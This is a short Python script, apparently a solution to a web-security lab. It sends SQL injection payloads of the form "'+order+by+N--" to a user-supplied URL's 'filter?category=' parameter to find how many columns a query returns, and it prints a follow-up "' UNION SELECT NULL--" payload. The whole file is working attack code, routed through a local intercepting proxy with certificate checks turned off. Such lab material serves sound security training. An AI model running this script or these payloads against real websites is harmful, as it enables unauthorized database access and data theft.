#!/usr/bin/env python3

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set proxies & path
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
path = "filter?category=Pets"


# Discover the number of columns
def enumerate_columns(url):
    """
    Iterate through the number of columns in the SQLi query
    """
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False


# Executing the script
def main():
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    else:print("[+] Enumerating the number of columns...")

    num_col = enumerate_columns(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        print(" If 1 column, then use: ' UNION SELECT NULL--")
        print("Increment NULL for each column discovered.")
    else:
        print("[-] The SQLi attack was not successful.")


if __name__ == "__main__":
    main()
